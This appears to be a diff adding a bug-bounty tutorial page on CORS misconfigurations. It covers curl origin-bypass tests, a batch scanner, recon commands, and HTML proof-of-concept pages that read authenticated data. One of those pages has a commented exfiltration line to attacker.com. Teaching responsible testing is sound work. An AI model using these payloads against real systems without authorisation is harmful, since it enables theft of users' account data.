+TARGET="https://api.example.com/v1/user/profile"
+
+echo "[*] Testing arbitrary origin reflection..."
+curl -s -I -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing null origin..."
+curl -s -I -H "Origin: null" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing HTTP downgrade..."
+curl -s -I -H "Origin: http://example.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing subdomain wildcard..."
+curl -s -I -H "Origin: https://evil.example.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing prefix bypass..."
+curl -s -I -H "Origin: https://example.com.evil.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing suffix bypass..."
+curl -s -I -H "Origin: https://notexample.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Testing backtick bypass..."
+curl -s -I -H "Origin: https://example.com%60.evil.com" "$TARGET" | grep -i "access-control"
+
+echo "[*] Done."</div>
+
+      <h3>Interpreting Results</h3>
+
+      <p>For each test, look at the full set of CORS headers returned:</p>
+
+      <ul>
+        <li>If <code>Access-Control-Allow-Origin</code> matches your injected origin AND <code>Access-Control-Allow-Credentials: true</code> is present — you have a finding.</li>
+        <li>If ACAO matches but ACAC is absent or false — check whether the endpoint returns anything useful without auth. If not, it is likely informational.</li>
+        <li>If ACAO is always <code>*</code> regardless of what you send — test whether unauthenticated data is sensitive. If it is just public data, move on.</li>
+      </ul>
+
+      <div class="callout-box">
+        <strong>Pro Tip: Use -v instead of -I for full context</strong>
+        <p>The <code>-I</code> flag sends a HEAD request, which some servers handle differently from GET. If you get no CORS headers with <code>-I</code>, try <code>curl -s -v -H "Origin: ..." URL 2>&1 | grep -i "access-control"</code> to see the full response on a GET request.</p>
+      </div>
+    </div>
+
+    <!-- Ad: after section 4 -->
+    <div class="ad-break">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-4629819662160550"
+           data-ad-slot="auto"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 5 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-5">
+      <h2><span class="num">Section 05</span>Automating at Scale</h2>
+
+      <p>Manual testing is essential for understanding, but real-world bug bounty hunting requires testing hundreds or thousands of endpoints. Here is how to build a lightweight pipeline.</p>
+
+      <h3>Step 1: Subdomain Enumeration</h3>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Bash: Recon Pipeline</span><span class="comment"># Gather subdomains using multiple sources</span>
+subfinder -d example.com -silent | sort -u > subs.txt
+
+<span class="comment"># Probe for live HTTP services</span>
+cat subs.txt | httpx -silent -status-code -title -tech-detect > live_hosts.txt
+
+<span class="comment"># Extract just the URLs</span>
+cat subs.txt | httpx -silent > urls.txt
+
+echo "[*] Found $(wc -l < urls.txt) live hosts"</div>
+
+      <h3>Step 2: Batch CORS Testing</h3>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">Bash: Batch CORS Scanner</span><span class="comment">#!/bin/bash</span>
+<span class="comment"># cors_scan.sh — batch test CORS across a list of URLs</span>
+
+INPUT="urls.txt"
+OUTPUT="cors_results.txt"
+ORIGIN="https://evil.com"
+
+echo "[*] Testing $(wc -l < $INPUT) URLs for CORS misconfig..."
+> "$OUTPUT"
+
+while IFS= read -r url; do
+  response=$(curl -s -D - -H "Origin: $ORIGIN" "$url" -o /dev/null --max-time 10 2>/dev/null)
+
+  acao=$(echo "$response" | grep -i "access-control-allow-origin" | tr -d '\r')
+  acac=$(echo "$response" | grep -i "access-control-allow-credentials" | tr -d '\r')
+
+  if echo "$acao" | grep -qi "$ORIGIN"; then
+    echo "[VULN] $url | $acao | $acac" | tee -a "$OUTPUT"
+  elif echo "$acao" | grep -qi "null"; then
+    echo "[NULL] $url | $acao | $acac" | tee -a "$OUTPUT"
+  fi
+done < "$INPUT"
+
+echo "[*] Results saved to $OUTPUT"</div>
+
+      <h3>Step 3: Rate Limiting Etiquette</h3>
+
+      <p>Responsible testing is not optional — it is a requirement for continued access to bug bounty programs.</p>
+
+      <ul>
+        <li><strong>Respect rate limits.</strong> Add a sleep (0.5 to 2 seconds) between requests. Use <code>sleep 1</code> in your loop or configure your tool's concurrency.</li>
+        <li><strong>Check scope carefully.</strong> Only test domains and endpoints explicitly listed in the program's scope. Wildcard scopes (e.g., <code>*.example.com</code>) still have exclusions — read the rules.</li>
+        <li><strong>Use a custom User-Agent.</strong> Include your HackerOne/Bugcrowd username so the target can identify your traffic: <code>-H "User-Agent: BugBountyHunter-YourUsername"</code></li>
+        <li><strong>Test during off-peak hours</strong> when possible, especially for smaller targets.</li>
+        <li><strong>Stop immediately</strong> if you notice errors, 429 responses, or signs of WAF blocking.</li>
+      </ul>
+
+      <div class="warn-box">
+        <strong>Automation without rate limiting can get you banned</strong>
+        <p>Programs will ban you permanently if your scanner hammers their infrastructure. One CORS finding is worth more than zero findings plus a lifetime ban. Be patient.</p>
+      </div>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 6 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-6">
+      <h2><span class="num">Section 06</span>Writing a High-Quality Report</h2>
+
+      <p>The difference between a report that earns a bounty and one that gets closed as "informational" often has nothing to do with the bug itself — it is about how you present it. Here is what triagers look for.</p>
+
+      <h3>Report Structure</h3>
+
+      <ol>
+        <li><strong>Title</strong> — Clear, specific, includes the affected endpoint. Example: "CORS misconfiguration on api.example.com/v1/user allows arbitrary origin with credentials"</li>
+        <li><strong>Severity</strong> — Be honest. Use the CVSS calculator. Do not inflate.</li>
+        <li><strong>Description</strong> — What is the vulnerability, in one paragraph.</li>
+        <li><strong>Steps to Reproduce</strong> — Exact curl commands that demonstrate the issue.</li>
+        <li><strong>Proof of Concept</strong> — A working HTML page that proves exploitation.</li>
+        <li><strong>Impact</strong> — What specific data can the attacker steal? Be concrete.</li>
+        <li><strong>Remediation</strong> — Brief suggestions for fixing the issue.</li>
+      </ol>
+
+      <h3>Proof of Concept Template</h3>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">HTML: CORS PoC Template</span>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CORS PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;CORS Misconfiguration PoC&lt;/h1&gt;
+  &lt;p&gt;If vulnerable, the user's data will appear below:&lt;/p&gt;
+  &lt;pre id="result"&gt;Loading...&lt;/pre&gt;
+
+  &lt;script&gt;
+    fetch('https://api.example.com/v1/user/profile', {
+      credentials: 'include'
+    })
+    .then(response =&gt; response.text())
+    .then(data =&gt; {
+      document.getElementById('result').textContent = data;
+      // In a real attack, the attacker would exfiltrate this:
+      // new Image().src = 'https://attacker.com/log?data=' +
+      //   encodeURIComponent(data);
+    })
+    .catch(err =&gt; {
+      document.getElementById('result').textContent =
+        'Request failed: ' + err.message;
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+
+      <h3>Null Origin PoC (Sandboxed Iframe)</h3>
+
+      <div class="code-block"><button class="copy-code" onclick="copyCode(this)">Copy</button><span class="code-label">HTML: Null Origin PoC</span>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Null Origin CORS PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Null Origin CORS PoC&lt;/h1&gt;
+  &lt;pre id="result"&gt;Loading...&lt;/pre&gt;
+
+  &lt;iframe sandbox="allow-scripts" srcdoc="
+    &lt;script&gt;
+      fetch('https://api.example.com/v1/user/profile', {
+        credentials: 'include'
+      })
+      .then(r =&gt; r.text())
+      .then(d =&gt; parent.postMessage(d, '*'));
+    &lt;/script&gt;
+  "&gt;&lt;/iframe&gt;
+
+  &lt;script&gt;
+    window.addEventListener('message', function(e) {
+      document.getElementById('result').textContent = e.data;
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+
+      <h3>Impact Sections That Get Payouts</h3>
+
+      <p>Weak impact statement: <em>"An attacker could exploit this CORS misconfiguration."</em></p>
+
+      <p>Strong impact statement: <em>"By hosting the attached PoC HTML file, an attacker can steal any authenticated user's profile data including their email address, full name, billing address, and active API keys. The attacker only needs to lure the victim to a URL they control (e.g., via phishing, social media link, or forum post). No further interaction is required."</em></p>
+
+      <div class="callout-box">
+        <strong>Pro Tip: Include a sanitised response sample</strong>
+        <p>Redact PII, but show the triager the exact JSON structure your PoC retrieves. If the response contains <code>{"email": "...", "api_key": "...", "billing": {...}}</code>, that visual proof of sensitive data is far more convincing than text descriptions alone.</p>
+      </div>
+    </div>
+
+    <!-- Ad: after section 6 -->
+    <div class="ad-break">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-4629819662160550"
+           data-ad-slot="auto"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 7 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-7">
+      <h2><span class="num">Section 07</span>Common False Positives and How to Avoid Them</h2>
+
+      <p>CORS testing generates a lot of noise. Here are the false positives that waste your time and damage your reputation if reported.</p>
+
+      <h3>1. CDN Wildcard Responses</h3>
+
+      <p>Many CDNs (CloudFront, Akamai, Fastly) add <code>Access-Control-Allow-Origin: *</code> to all responses by default for static assets. This is by design — CSS files, images, and fonts need to load cross-origin. Unless the CDN endpoint returns authenticated user data, this is not a vulnerability.</p>
+
+      <p><strong>How to verify:</strong> Check whether the endpoint requires authentication. If it returns the same data without cookies, it is public content served via CDN. Move on.</p>
+
+      <h3>2. Pre-flight Only (No Credentials)</h3>
+
+      <p>Some servers respond to OPTIONS pre-flight requests with permissive CORS headers but do not include <code>Access-Control-Allow-Credentials: true</code>. Without credentials, the browser will not send cookies — meaning the response will not contain user-specific data.</p>
+
+      <p><strong>How to verify:</strong> Send a GET request with the <code>Origin</code> header (not just OPTIONS). Confirm that <code>ACAC: true</code> is present in the actual response, not just the pre-flight.</p>
+
+      <h3>3. Internal-Only Services With No User Data</h3>
+
+      <p>You might find a CORS misconfiguration on an internal API that returns infrastructure data (server health, version numbers, config). If this endpoint is only accessible internally and contains no user data or secrets, the impact is limited.</p>
+
+      <p><strong>How to verify:</strong> Check what the endpoint actually returns. Health check endpoints like <code>/status</code> or <code>/ping</code> that return <code>{"status": "ok"}</code> are almost never worth reporting.</p>
+
+      <h3>4. CORS Without Exploitable Data</h3>
+
+      <p>A perfectly misconfigured CORS policy on an endpoint that returns zero sensitive data is not a vulnerability. The CORS misconfiguration is the mechanism — the impact comes from what data it exposes.</p>
+
+      <div class="warn-box">
+        <strong>Before you hit "Submit" — ask these three questions</strong>
+        <p>1. Does the response contain user-specific or sensitive data? 2. Does the server send <code>ACAC: true</code> on the actual request (not just pre-flight)? 3. Does my PoC work in a real browser, not just curl? If any answer is "no," reconsider whether this is reportable.</p>
+      </div>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── SECTION 8 ──────────────────────────────────────────── -->
+    <div class="section-block" id="section-8">
+      <h2><span class="num">Section 08</span>Real-World Impact Scenarios</h2>
+
+      <p>To understand why CORS misconfigurations matter, here are fictional but realistic scenarios that demonstrate exploitation chains. All examples use fictional companies and domains.</p>
+
+      <h3>Scenario 1: Cookie Theft on Shared Parent Domains</h3>
+
+      <p>Imagine <code>app.acmecorp.com</code> sets a session cookie with <code>Domain=.acmecorp.com</code>. Their API at <code>api.acmecorp.com</code> trusts all <code>*.acmecorp.com</code> subdomains via CORS. An attacker finds an XSS on <code>blog.acmecorp.com</code> (a third-party WordPress installation with a plugin vulnerability).</p>
+
+      <p>The attack chain:</p>
+      <ol>
+        <li>Attacker exploits XSS on <code>blog.acmecorp.com</code> to inject JavaScript</li>
+        <li>Because <code>blog.acmecorp.com</code> shares the parent domain cookie, the browser includes the session cookie with requests to <code>api.acmecorp.com</code></li>
+        <li>The CORS policy trusts <code>blog.acmecorp.com</code> as a valid subdomain origin</li>
+        <li>The injected JS reads the API response containing the user's account data and exfiltrates it to the attacker's server</li>
+      </ol>
+
+      <p><strong>Impact:</strong> Full account data theft for any user who visits the compromised blog page. No additional user interaction required beyond the initial page visit.</p>
+
+      <h3>Scenario 2: OAuth Token Interception</h3>
+
+      <p>A SaaS application at <code>dashboard.exampleapp.com</code> uses OAuth and stores the access token in a response from <code>auth.exampleapp.com/token</code>. The token endpoint has a CORS misconfiguration — it reflects any origin with credentials.</p>
+
+      <p>The attacker hosts a page that requests <code>auth.exampleapp.com/token</code> with the victim's cookies. The response includes a fresh OAuth access token. The attacker now has API access equivalent to the victim's session — and the token works from any origin.</p>
+
+      <p><strong>Impact:</strong> OAuth token theft allows the attacker to impersonate the victim indefinitely (until token expiry), access all connected services, and potentially pivot to other integrations.</p>
+
+      <h3>Scenario 3: Internal API Data Exfiltration</h3>
+
+      <p>A company exposes an internal API at <code>internal.acmecorp.com</code> that relies on VPN access for security instead of per-request authentication. The API returns employee directories, salary bands, and project codenames. The CORS policy is <code>ACAO: *</code> because "only internal users can reach it anyway."</p>
+
+      <p>An attacker who compromises any internal machine (phishing, malware) can serve a local HTML page that reads from the API. Because <code>ACAO: *</code> allows any origin and the user is on the VPN, the browser happily fetches and returns all internal data to the attacker's exfiltration endpoint.</p>
+
+      <p><strong>Impact:</strong> Internal data exfiltration. This is the scenario where <code>ACAO: *</code> without credentials <em>is</em> actually dangerous — the "authentication" is network-level, and once the attacker is inside the network, the CORS policy provides zero protection.</p>
+
+      <div class="callout-box">
+        <strong>Pro Tip: Always think in chains</strong>
+        <p>The highest-paying CORS reports are rarely standalone. They chain with other weaknesses: subdomain takeover, XSS on a sibling subdomain, session misconfiguration, or network-level access assumptions. When you find a CORS misconfig, ask yourself: "What else on this attack surface could make this worse?"</p>
+      </div>
+    </div>
+
+    <!-- Ad: after section 8 -->
+    <div class="ad-break">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-4629819662160550"
+           data-ad-slot="auto"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ── Subtle CTA bridge ──────────────────────────────────── -->
+    <div class="section-block">
+      <p>While our main focus is gaming optimisation, the analytical mindset behind security research is the same one that drives performance tuning. Identifying misconfigurations, testing systematically, measuring impact — whether you are hunting CORS bugs or hunting frames. If you want to see that mindset applied to VALORANT FPS, check out <a href="https://valooptimise.com" target="_blank" rel="noopener noreferrer" style="color: var(--accent2); font-weight: 600;">Valo Optimise</a> — it applies the same methodical, evidence-based approach to getting every last frame out of your hardware.</p>
+    </div>
+
+    <!-- Author card -->
+    <div class="author-card">
+      <div class="author-avatar">HJ</div>
+      <div class="author-info">
+        <h4>Harvey Jenkins</h4>
+        <div class="author-role">Security Researcher &amp; Developer</div>
+        <p>CEH and Security+ certified. Builds Valo Optimise by day, hunts bugs by night. Believes that the same systematic thinking that finds vulnerabilities in web applications can find the hidden performance bottlenecks in your gaming setup.</p>
+      </div>
+    </div>
+
+    <!-- Share section -->
+    <div class="share-section">
+      <h3>Found This Useful?</h3>
+      <p>Share it with your fellow hunters. Good methodology benefits the entire community.</p>
+      <div class="share-btns">
+        <button class="share-btn twitter" onclick="shareTwitter()">
+          Share on X
+        </button>
+        <button class="share-btn reddit" onclick="shareReddit()">
+          Share on Reddit
+        </button>
+        <button class="share-btn copy" onclick="copyLink(this)">
+          Copy Link
+        </button>
+      </div>
+    </div>
+
+    <!-- Related articles -->
+    <div>
+      <h3 style="font-size:18px;font-weight:700;margin-bottom:16px;">More from the Blog</h3>
+      <div class="related-grid">
+        <a class="related-card" href="how-to-boost-fps-valorant-windows-11-2026.html">
+          <div class="tags"><span class="tag">FPS Boost</span></div>
+          <h4>How to Boost FPS in VALORANT on Windows 11 (2026)</h4>
+          <p>12 proven tweaks that actually work. Average +47fps reported by players.</p>
+        </a>
+        <a class="related-card" href="how-to-fix-valorant-stuttering-windows-11.html">
+          <div class="tags"><span class="tag">Stuttering Fix</span></div>
+          <h4>How to Fix VALORANT Stuttering on Windows 11</h4>
+          <p>Deep dive into frame time consistency — why your FPS number lies to you.</p>
+        </a>
+        <a class="related-card" href="how-to-reduce-ping-valorant-network-guide-2026.html">
+          <div class="tags"><span class="tag">Network</span></div>
+          <h4>How to Reduce Ping in VALORANT — The Full Network Guide</h4>
+          <p>Router settings, DNS, QoS, and the registry tweaks that actually matter.</p>
+        </a>
+      </div>
+    </div>
+
+  </article>
+</div>
+
+<!-- Floating CTA -->
+<a href="https://valooptimise.com" id="floating-cta" target="_blank" rel="noopener noreferrer">
+  Download Valo Optimise
+</a>
+
+<!-- Footer -->
+<footer>
+  <p style="margin-bottom:8px;">
+    <a href="../index.html">Blog Home</a> &nbsp;&middot;&nbsp;
+    <a href="https://valooptimise.com" target="_blank" rel="noopener noreferrer">Valo Optimise App</a> &nbsp;&middot;&nbsp;
+    <a href="https://valooptimise.com/docs/privacy.html" target="_blank" rel="noopener noreferrer">Privacy</a>
+  </p>
+  <p>&copy; 2026 Valo Optimise Ltd &middot; Not affiliated with Riot Games &middot; All optimisations are OS-level and Vanguard-safe</p>
+</footer>
+
+<script>
+  // ── Reading progress bar
+  window.addEventListener('scroll', () => {
+    const scrolled = window.scrollY;
+    const total = document.documentElement.scrollHeight - window.innerHeight;
+    document.getElementById('progress-bar').style.width = Math.min(100, (scrolled / total) * 100) + '%';
+
+    // Floating CTA appears after 500px scroll
+    const cta = document.getElementById('floating-cta');
+    if (scrolled > 500) cta.classList.add('visible');
+    else cta.classList.remove('visible');
+  });
+
+  // ── Copy code buttons
+  function copyCode(btn) {
+    const code = btn.parentElement.textContent.replace('Copy', '').trim();
+    navigator.clipboard.writeText(code).then(() => {
+      btn.textContent = 'Copied!';
+      setTimeout(() => btn.textContent = 'Copy', 2000);
+    });
+  }
+
+  // ── Share functions
+  function shareTwitter() {
+    const text = encodeURIComponent('Complete guide to finding CORS misconfigurations in bug bounties — 7 bypass vectors, curl one-liners, and report templates');
+    const url  = encodeURIComponent(window.location.href);
+    window.open('https://twitter.com/intent/tweet?text=' + text + '&url=' + url, '_blank');
+  }
+
+  function shareReddit() {
+    const title = encodeURIComponent('How to Find CORS Misconfigurations in Bug Bounties (2026) — The Complete Methodology');
+    const url   = encodeURIComponent(window.location.href);
+    window.open('https://reddit.com/submit?title=' + title + '&url=' + url, '_blank');
+  }
+
+  function copyLink(btn) {
+    navigator.clipboard.writeText(window.location.href).then(() => {
+      btn.textContent = 'Copied!';
+      setTimeout(() => btn.textContent = 'Copy Link', 2000);
+    });
+  }
+
+  // ── Active TOC highlight
+  const sections = document.querySelectorAll('.section-block[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        tocLinks.forEach(link => {
+          link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
+        });
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+
+</body>
+</html>
